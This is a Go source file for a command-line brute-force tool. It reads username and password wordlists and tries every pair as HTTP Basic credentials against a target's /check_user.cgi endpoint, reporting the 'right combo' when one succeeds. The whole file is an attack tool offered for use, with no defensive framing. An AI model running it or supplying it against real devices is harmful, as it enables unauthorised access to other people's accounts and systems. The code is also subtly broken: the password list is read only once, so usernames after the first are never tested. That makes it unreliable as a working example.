package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"net/http"
	"os"
)

var (
	userlist string
	passlist string
	target   string
)

func init() {
	flag.StringVar(&userlist, "userlist", "", "Userlist to test")
	flag.StringVar(&passlist, "passlist", "", "password list to test")
	flag.StringVar(&target, "target", "", "target to attack")
}

func main() {

	flag.Parse()
	understand(userlist, passlist, target)
}

func login(ipaddr string, word string) {
	loginBytes := []byte(word)
	login64 := base64.StdEncoding.EncodeToString(loginBytes)

	client := &http.Client{}
	url := fmt.Sprintf("http://%s/check_user.cgi", ipaddr)
	r, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Issue creating request.:", err)
		return
	}

	basic := fmt.Sprintf("Basic %s", login64)

	r.Header.Add("Authorization", basic)

	req, err := client.Do(r)
	if err != nil {
		fmt.Println("GET request failed:", err)
		return
	}

	defer req.Body.Close()

	if req.StatusCode != 200 {
		fmt.Println(word + " is the wrong combo! " + req.Status)
	} else {
		fmt.Println(word + " is the right combo! " + req.Status)
		os.Exit(200)
	}
}

// read the wordlists
func understand(users string, passes string, target string) {

	//open userlist
	userlist, err := os.Open(users)
	if err != nil {
		fmt.Println("error with file 1", err)
		return
	}
	defer userlist.Close()

	//open passlist
	passlist, err := os.Open(passes)
	if err != nil {
		fmt.Println("error with file 2", err)
		return
	}
	defer passlist.Close()

	//scan the lists
	usernameList := bufio.NewScanner(userlist)
	passwordList := bufio.NewScanner(passlist)

	for usernameList.Scan() {
		username := usernameList.Text()

		for passwordList.Scan() {
			password := passwordList.Text()

			concat := fmt.Sprintf("%s:%s", username, password)

			login(target, concat)

		}

	}

}
